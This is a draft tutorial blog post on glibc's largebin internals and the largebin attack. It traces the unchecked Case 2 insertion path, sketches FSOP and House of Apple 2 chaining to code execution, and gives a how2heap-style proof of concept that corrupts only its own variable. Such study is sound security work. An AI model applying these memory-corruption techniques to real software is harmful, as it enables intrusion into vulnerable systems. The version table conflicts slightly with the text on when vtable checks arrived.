---
title: "Largebin Internals and the Largebin Attack"
date: 2026-03-12
tags: ["heap", "largebin", "glibc", "ptmalloc", "uaf", "house-of-apple", "fsop"]
topics: ["pwn"]
summary: "A deep dive into glibc's largebin data structure and the largebin attack primitive, from the sorted nextsize skiplist to the unchecked Case 2 insertion path that survives even modern glibc."
difficulty: hard
draft: true
---

{{< katex >}}

Before understanding the largebin attack, you need to understand what a largebin actually is, how chunks are organized inside one, and why the insertion code is structured the way it is. This post walks through all of that, then builds up to the attack itself.

All source references point to [glibc 2.35 on Bootlin](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c) unless otherwise noted. Line numbers may shift across versions, so use the identifier links when possible.

---

## The malloc_chunk struct

Every chunk in ptmalloc (glibc's allocator) uses the same base structure, defined in [`malloc/malloc.c`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c):

```c
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free). */
    INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};
```

On a 64-bit system, the layout of a free large chunk in memory looks like this:

{{< mermaid >}}
block-beta
    columns 2
    block:header:2
        columns 2
        a["prev_size"] b["size | flags"]
    end
    block:links:2
        columns 2
        c["fd"] d["bk"]
    end
    block:nextsize:2
        columns 2
        e["fd_nextsize"] f["bk_nextsize"]
    end
    block:userdata:2
        columns 1
        g["... (remaining user data) ..."]
    end
{{< /mermaid >}}

The `fd` and `bk` pointers sit at offsets `+0x10` and `+0x18` from the chunk start. The `fd_nextsize` and `bk_nextsize` pointers sit at `+0x20` and `+0x28`. When the chunk is allocated, all four pointer fields overlap with user data. The `fd_nextsize` and `bk_nextsize` fields are **only used in largebins**.

---

## Bins overview

ptmalloc maintains 128 bins in each arena ([`NBINS`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1576)). Bin 0 is unused, bin 1 is the unsorted bin, bins 2 through 63 are smallbins, and bins 64 through 126 are largebins.

| Bin type | Index range | Chunks per bin | Ordering | Extra pointers |
|----------|-------------|----------------|----------|----------------|
| Unsorted | 1 | Any size | Insertion order (FIFO) | `fd`, `bk` |
| Small | 2 -- 63 | Exact size match | FIFO | `fd`, `bk` |
| Large | 64 -- 126 | Range of sizes | **Sorted, descending** | `fd`, `bk`, `fd_nextsize`, `bk_nextsize` |

The minimum large chunk size on 64-bit is defined by [`MIN_LARGE_SIZE`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1580):

```c
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT   /* 16 on 64-bit */
#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)
```

With `MALLOC_ALIGNMENT = 0x10` and `SMALLBIN_CORRECTION = 0` on standard 64-bit: \\(0x40 \times 0x10 = 0x400\\) bytes. Any free chunk of size \\(\geq\\) 0x400 bytes that gets sorted out of the unsorted bin lands in a largebin.

---

## Largebin size ranges

The 63 largebins cover increasingly wide size ranges, arranged in 6 groups with logarithmically increasing spacing. The [`largebin_index_64`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1608) macro encodes this:

```c
#define largebin_index_64(sz)                                                \
  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\
   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\
   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\
   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\
   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\
   126)
```

| Group | Bins | Spacing | Size range |
|-------|------|---------|------------|
| 1 | 32 | 0x40 | 0x400 -- 0xc00 |
| 2 | 16 | 0x200 | 0xc00 -- 0x2c00 |
| 3 | 8 | 0x1000 | 0x2c00 -- 0xab00 |
| 4 | 4 | 0x8000 | 0xab00 -- 0x2ab00 |
| 5 | 2 | 0x40000 | 0x2ab00 -- 0xaac00 |
| 6 | 1 | remainder | \\(\geq\\) 0xaac00 |

Because each largebin covers a range, a single bin can contain chunks of different sizes. This is the fundamental difference from smallbins: a largebin needs an internal ordering scheme to efficiently find best-fit chunks.

---

## The sorted list and the nextsize skiplist

Within a single largebin, chunks are maintained in **descending order by size**. The largest chunk is at the head (`bin->fd`), the smallest at the tail (`bin->bk`).

Two parallel circular doubly-linked lists run through every largebin:

1. **The fd/bk list** contains *every* free chunk in the bin. Chunks of the same size are grouped together, with the first chunk of each size (the "representative") at the front of its group.

2. **The fd_nextsize/bk_nextsize list** contains *only* the representative of each unique size. This forms a skiplist that lets the allocator jump between size groups without traversing duplicates.

For a bin containing chunks of sizes 0x500, 0x500, 0x480, and 0x440 (in that order), the structure looks like this:

{{< mermaid >}}
flowchart LR
    BIN["bin head"]

    A["A<br>0x500"]
    A2["A2<br>0x500"]
    B["B<br>0x480"]
    C["C<br>0x440"]

    BIN -->|fd| A -->|fd| A2 -->|fd| B -->|fd| C -->|fd| BIN

    A -.->|fd_nextsize| B -.->|fd_nextsize| C -.->|fd_nextsize| A

    style A fill:#4a9eff,color:#fff
    style A2 fill:#7ab8ff,color:#fff
    style B fill:#ff6b6b,color:#fff
    style C fill:#51cf66,color:#fff
    style BIN fill:#868e96,color:#fff
{{< /mermaid >}}

Solid arrows are the **fd chain** (every chunk, largest to smallest). Dashed arrows are the **fd_nextsize chain** (representatives only, skipping duplicates). Both chains are circular doubly-linked lists; `bk` and `bk_nextsize` go in the reverse direction but are omitted from the diagram for clarity.

Key observations:

- A2 (the duplicate 0x500 chunk) does NOT participate in the nextsize chain. Its `fd_nextsize`/`bk_nextsize` fields are not set by the insertion code.
- The bin head does NOT participate in the nextsize chain either. It is circular only among representatives: the smallest's `fd_nextsize` wraps back to the largest.
- `fd_nextsize` points toward the next **smaller** size. `bk_nextsize` points toward the next **larger** size.

### Why this design?

When `_int_malloc` searches for a best-fit chunk, it can skip entire groups of same-sized chunks by following `fd_nextsize`. Without the skiplist, a bin containing 1000 chunks of 50 different sizes would require traversing all 1000 chunks. With the skiplist, it traverses at most 50 representatives. This matters because largebins can accumulate many chunks during heavy allocation/deallocation workloads.

---

## Largebin insertion: the code path that matters

Chunks do not get inserted into largebins directly by `free()`. Instead, `free()` places chunks into the unsorted bin (or tcache/fastbin for smaller sizes). The sorting into largebins happens inside [`_int_malloc`](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_int_malloc), during the unsorted bin processing loop.

When `_int_malloc` iterates the unsorted bin and finds a chunk (`victim`) that does not satisfy the current allocation request, it moves that chunk into the appropriate bin. For large chunks, the relevant code is (simplified with annotations):

```c
/* We're in the else branch: !in_smallbin_range(size) */
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;

if (fwd != bck)               /* Case: bin is NOT empty */
  {
    size |= PREV_INUSE;       /* speed optimization for comparisons */

    if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk))
      {
        /* -------- CASE 2: victim is smaller than everything -------- */
        fwd = bck;
        bck = bck->bk;

        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
      }
    else
      {
        /* -------- CASE 3: find insertion point -------- */
        while ((unsigned long)size < (unsigned long)chunksize_nomask(fwd))
          fwd = fwd->fd_nextsize;

        if ((unsigned long)size == (unsigned long)chunksize_nomask(fwd))
          /* CASE 3a: exact size match, insert as duplicate */
          fwd = fwd->fd;
        else
          {
            /* CASE 3b: new unique size, insert into nextsize chain */
            victim->fd_nextsize = fwd;
            victim->bk_nextsize = fwd->bk_nextsize;
            if (__glibc_unlikely(fwd->bk_nextsize->fd_nextsize != fwd))  /* CHECK */
              malloc_printerr("malloc(): largebin double linked list corrupted (nextsize)");
            fwd->bk_nextsize = victim;
            victim->bk_nextsize->fd_nextsize = victim;
          }
        bck = fwd->bk;
        if (bck->fd != fwd)                                               /* CHECK */
          malloc_printerr("malloc(): largebin double linked list corrupted (bk)");
      }
  }
else                           /* Case 1: bin is empty */
  victim->fd_nextsize = victim->bk_nextsize = victim;

/* Common: link into fd/bk chain */
mark_bin(av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

There are three distinct insertion cases. Understanding which one is exploitable (and why) is the core of the largebin attack.

---

## Case 1: Empty bin

```c
victim->fd_nextsize = victim->bk_nextsize = victim;
```

The victim becomes the sole chunk. Its nextsize pointers point to itself (circular list of one). The fd/bk linking at the bottom inserts it between `bck` (bin head) and `fwd` (also bin head, since `fwd == bck`). Nothing interesting for exploitation here.

---

## Case 2: Victim is the new smallest

This is the path taken when the victim's size is strictly less than `chunksize_nomask(bck->bk)`, the size of the current smallest chunk in the bin. The victim needs to go at the tail and become a new representative in the nextsize chain.

```c
fwd = bck;          /* fwd = bin head */
bck = bck->bk;      /* bck = current smallest chunk */

victim->fd_nextsize = fwd->fd;                                   /* (1) */
victim->bk_nextsize = fwd->fd->bk_nextsize;                      /* (2) */
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; /* (3) */
```

Let's trace this with the bin from our earlier example. Suppose a new chunk D (size 0x420) is being inserted, and C (0x440) is the current smallest:

**Before insertion**, the nextsize chain is: A (0x500) ↔ B (0x480) ↔ C (0x440), circular.

- `fwd->fd` is `bin->fd`, which is A (the largest chunk).
- `fwd->fd->bk_nextsize` is A's `bk_nextsize`, which is C (the current smallest).

**Line (1):** `victim->fd_nextsize = A` (D points to the largest).

**Line (2):** `victim->bk_nextsize = C` (D points back to the previous smallest).

**Line (3):** This is a compound assignment: `A->bk_nextsize = D` and `C->fd_nextsize = D`.

After insertion, the nextsize chain becomes: A ↔ B ↔ C ↔ D, circular. D is the new smallest, correctly linked.

**The critical observation: there are NO security checks on this path.** No verification that `fwd->fd->bk_nextsize->fd_nextsize == fwd->fd` or any other consistency check. This is the path exploited by the modern largebin attack.

---

## Case 3a: Duplicate size

```c
if ((unsigned long)size == (unsigned long)chunksize_nomask(fwd))
    fwd = fwd->fd;
```

If the victim's size matches an existing representative, it is inserted as a duplicate: second position after the representative. The nextsize chain is not modified at all. The `fwd = fwd->fd` adjustment ensures the common fd/bk linking code places the victim right after the representative. Not exploitable in an interesting way.

---

## Case 3b: New unique size (not smallest)

```c
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
if (__glibc_unlikely(fwd->bk_nextsize->fd_nextsize != fwd))       /* CHECK 1 */
    malloc_printerr("malloc(): largebin double linked list corrupted (nextsize)");
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;
/* ... */
bck = fwd->bk;
if (bck->fd != fwd)                                                /* CHECK 2 */
    malloc_printerr("malloc(): largebin double linked list corrupted (bk)");
```

This path inserts the victim into the nextsize chain between `fwd` (a smaller or equal-sized representative found by the `while` loop) and `fwd->bk_nextsize` (the next larger representative). Two integrity checks were added in **glibc 2.30** ([commit for bug 24216](https://sourceware.org/bugzilla/show_bug.cgi?id=24216)):

- **CHECK 1:** Verifies `fwd->bk_nextsize->fd_nextsize == fwd` (nextsize doubly-linked consistency).
- **CHECK 2:** Verifies `bck->fd == fwd` (fd/bk doubly-linked consistency).

These checks block the original (pre-2.30) largebin attack on this code path.

---

## The largebin attack

With the insertion mechanics understood, we can now see why Case 2 is exploitable. The attack allows writing a heap address to an arbitrary location. You control *where* but not *what* (the value is always the address of a victim chunk).

### Prerequisites

- A **UAF or overflow** that lets you corrupt the metadata of a chunk already sitting in a largebin.
- The ability to trigger allocations that move chunks from the unsorted bin into the target largebin.
- At minimum, corruption of the `bk_nextsize` field of the largebin chunk (at offset `+0x28` from the chunk header, or `+0x18` from user data on 64-bit).

### The setup

1. Allocate two large chunks in the same largebin range, with p1 slightly larger than p2:
   - p1: size 0x438 (including header; user size 0x428)
   - p2: size 0x428 (including header; user size 0x418)
   - Place guard chunks between them to prevent consolidation.

2. Free p1 and trigger a `malloc` larger than p1. This forces `_int_malloc` to process the unsorted bin, moving p1 into its largebin. p1 is now the only chunk in the bin (Case 1 insertion, self-referencing nextsize).

3. Free p2. It goes into the unsorted bin.

At this point: p1 is in the largebin (the largest and smallest chunk, since it is the only one). p2 is in the unsorted bin.

### The corruption

Using the UAF or overflow primitive, corrupt **p1's `bk_nextsize`** field:

```
p1->bk_nextsize = &target - 0x20
```

Where `target` is the address you want to write to. The `- 0x20` offset accounts for the fact that the write will land at `bk_nextsize + 0x20` (the `fd_nextsize` field offset).

### The trigger

Trigger another `malloc` that processes the unsorted bin. p2 (the victim) is smaller than p1, so it enters the **Case 2** path:

```c
fwd = bck;             /* bin head */
bck = bck->bk;         /* p1 (current smallest = current largest = only chunk) */

victim->fd_nextsize = fwd->fd;                                     /* p2->fd_nextsize = p1 */
victim->bk_nextsize = fwd->fd->bk_nextsize;                        /* p2->bk_nextsize = p1->bk_nextsize */
                                                                    /*                = &target - 0x20   */
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;  /* THE WRITE */
```

Expanding the compound assignment on the last line:

1. `victim->bk_nextsize->fd_nextsize = victim`
   This is: `*(&target - 0x20 + 0x20) = victim`, which simplifies to `*target = &p2`.

2. `fwd->fd->bk_nextsize = victim`
   This is: `p1->bk_nextsize = &p2` (repairs the corrupted pointer, harmless).

**Result:** The address of p2 is written to `target`. One arbitrary write of a heap pointer.

### Diagram of the attack

The state before and after the trigger:

{{< mermaid >}}
flowchart TD
    subgraph before["Before trigger"]
        direction TB
        LB1["Largebin"]
        UB1["Unsorted bin"]
        P1a["p1 (0x438)<br>bk_nextsize = &target - 0x20<br>(CORRUPTED)"]
        P2a["p2 (0x428)"]
        LB1 --> P1a
        UB1 --> P2a
    end

    subgraph after["After trigger"]
        direction TB
        LB2["Largebin"]
        P1b["p1 (0x438)"]
        P2b["p2 (0x428)"]
        TGT["target<br>now contains &p2"]
        LB2 --> P1b
        P1b --> P2b
        P2b -.->|"wrote &p2"| TGT
    end

    before --> after

    style P1a fill:#ff6b6b,color:#fff
    style TGT fill:#51cf66,color:#fff
    style P2b fill:#4a9eff,color:#fff
{{< /mermaid >}}

---

## Pre-2.30: the original two-write variant

Before glibc 2.30 added the checks on Case 3b, that path was also exploitable, and yielded **two** arbitrary writes instead of one.

The original technique (documented by [dangokyo](https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/)) corrupts a chunk already in the largebin (call it p2) with:

- **p2->bk_nextsize** = `&target1 - 0x20`
- **p2->bk** = `&target2 - 0x10`
- **p2->size** shrunk to a smaller value

Then a larger victim (p3) enters the bin and takes the Case 3b path with `fwd = p2`. The two writes:

```c
victim->bk_nextsize->fd_nextsize = victim;   /* *target1 = &p3 */
/* ... */
bck = fwd->bk;    /* bck = &target2 - 0x10 */
bck->fd = victim;  /* *target2 = &p3 */
```

This variant is completely blocked on glibc \\(\geq\\) 2.30 by CHECK 1 and CHECK 2. It is only relevant for older libc versions.

---

## What can you do with one heap pointer write?

Writing a heap address to an arbitrary location is not directly useful for code execution. You do not control the value being written (it is always a heap pointer), and a single pointer overwrite typically cannot hijack control flow on its own. The largebin attack is a **setup primitive**, not a standalone exploit technique.

The most common use is overwriting [`_IO_list_all`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L684) with a heap address, then crafting a fake `FILE` structure at that heap address. When the program exits, the chain:

```
exit() → __run_exit_handlers() → _IO_cleanup() → _IO_flush_all_lockp()
```

traverses `_IO_list_all` and calls `_IO_OVERFLOW` on each FILE. If `_IO_list_all` points to your fake FILE, you control the vtable dispatch.

### House of Apple 2 (glibc 2.35+)

Since glibc 2.24, vtable pointers in FILE structures are bounds-checked by [`_IO_validate_vtable`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L879). The vtable must point within the `__libc_IO_vtables` section, so you cannot point it at a heap-controlled fake vtable directly.

The bypass (House of Apple 2, documented by [roderick01](https://bbs.kanxue.com/thread-273832.htm)) uses a two-level indirection through `_wide_data`:

1. Set the fake FILE's vtable to [`_IO_wfile_jumps`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c) (passes bounds check, it is within `__libc_IO_vtables`).
2. Set `_wide_data` to point to a controlled region on the heap.
3. In that controlled region, set `_wide_data->_wide_vtable` to point to another heap region containing a fake wide vtable.
4. The `_wide_vtable` pointer is **NOT bounds-checked**.
5. When `_IO_wfile_overflow` is called, it dispatches through `_wide_vtable`, calling a function pointer you control.

This gives arbitrary function execution (typically `system("/bin/sh")` or a ROP pivot).

### Overwriting `global_max_fast` (pre-2.34)

Before `__malloc_hook` and `__free_hook` were removed in glibc 2.34, a common technique was using the largebin attack to overwrite `global_max_fast` with a large heap address. This makes the allocator treat very large chunks as fastbin-eligible, enabling fastbin-based attacks (fastbin dup, etc.) at sizes that would normally be impossible.

---

## Glibc version timeline

| Version | Change | Impact |
|---------|--------|--------|
| < 2.30 | No checks on largebin insertion | Case 2 and Case 3b both exploitable; two writes possible |
| **2.30** | Added CHECK 1 and CHECK 2 on Case 3b ([bug 24216](https://sourceware.org/bugzilla/show_bug.cgi?id=24216)) | Case 3b blocked. Case 2 remains unchecked. |
| 2.32 | Safe-linking for tcache/fastbins | Unrelated to largebins directly, but affects chaining attacks |
| **2.34** | `__malloc_hook`, `__free_hook` removed | Cannot overwrite hooks; must use FSOP chains |
| 2.35 | Vtable bounds checking | Must use `_wide_data` vtable bypass (House of Apple 2) |
| 2.37+ | Ongoing hardening | Case 2 path **still unchecked** as of glibc 2.39 |

The unchecked Case 2 path survives because the integrity checks added in 2.30 only apply to Case 3b. In Case 2, the chunk whose `bk_nextsize` is corrupted (`fwd->fd`, the largest chunk) is not the `fwd` variable that the checks validate. No check was added to verify `fwd->fd->bk_nextsize->fd_nextsize == fwd->fd` on this path.

---

## Putting it all together: a minimal PoC

This is a condensed proof of concept (adapted from [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c)) demonstrating the write primitive:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long target = 0;
    printf("target is at %p, currently 0x%lx\n", &target, target);

    /*
     * p1 (0x428) will end up in the largebin.
     * p2 (0x418) will be the victim that triggers the write.
     * Guards prevent consolidation.
     */
    unsigned long *p1 = malloc(0x428);
    malloc(0x18);  /* guard */
    unsigned long *p2 = malloc(0x418);
    malloc(0x18);  /* guard */

    /* Move p1 into unsorted bin, then into largebin */
    free(p1);
    malloc(0x438);  /* larger than p1; forces p1 out of unsorted bin into largebin */

    /* Move p2 into unsorted bin */
    free(p2);

    /*
     * Corrupt p1's bk_nextsize.
     * p1's user data starts at p1[0]. The chunk header is 0x10 bytes before.
     * fd_nextsize is at chunk+0x20 = user+0x10 = p1[2]
     * bk_nextsize is at chunk+0x28 = user+0x18 = p1[3]
     */
    p1[3] = (unsigned long)(&target) - 0x20;

    /* Trigger: process unsorted bin, p2 enters largebin via Case 2 */
    malloc(0x438);

    printf("target is now 0x%lx\n", target);
    /* target now contains the heap address of p2's chunk */

    return 0;
}
```

Compile and run:

```sh
gcc -o largebin_attack largebin_attack.c -no-pie
./largebin_attack
```

The output will show `target` changed from `0x0` to a heap address.

---

## Source references

- [glibc 2.35 `malloc/malloc.c`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c) (Bootlin)
- [`_int_malloc` identifier](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_int_malloc) (Bootlin)
- [`malloc_chunk` struct](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1153) (Bootlin)
- [`largebin_index_64` macro](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1608) (Bootlin)
- [Bug 24216: largebin corruption checks](https://sourceware.org/bugzilla/show_bug.cgi?id=24216) (glibc Bugzilla)
- [how2heap: large_bin_attack (glibc 2.35)](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c) (shellphish)
- [how2heap: large_bin_attack (glibc 2.23)](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/large_bin_attack.c) (shellphish)
- [dangokyo: A Revisit to Large Bin in Glibc](https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/)
- [House of Apple 2 (roderick01)](https://bbs.kanxue.com/thread-273832.htm)
